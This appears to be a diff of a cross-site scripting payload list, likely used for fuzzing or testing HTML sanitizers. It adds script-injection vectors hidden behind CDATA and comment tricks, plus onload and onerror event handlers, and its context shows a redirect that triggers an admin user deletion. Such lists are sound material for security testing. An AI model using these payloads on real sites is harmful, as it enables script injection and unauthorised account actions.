@@ -174,7 +174,8 @@ url(javascript:document.write("XSS-XSS-XSS"););">
 <object classid="clsid:..."
 codebase="javascript:document.write("XSS-XSS-XSS");">
 <style><!--</style><script>document.write("XSS-XSS-XSS");//--></script>
-<![CDATA[<!--]]><script>document.write("XSS-XSS-XSS");//--></script>
+<![CDATA[<!--]]><script>document.write("XSS");//--></script>
+<!--]]><script>document.write("XSS");//--></script>
 <!-- -- --><script>document.write("XSS-XSS-XSS");</script><!-- -- -->
 <<script>document.write("XSS-XSS-XSS");</script>
 <img src="blah"onmouseover="document.write("XSS-XSS-XSS");">
@@ -439,5 +440,5 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
 <DIV STYLE="background-image: url(javascript:alert('XSS'))">
 <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
 <DIV STYLE="width: expression(alert('XSS'));">
-
-
+<b onload="alert(1)">Document Title</b>
+<span onerror="alert(1)">text within a SPAN tag</span>
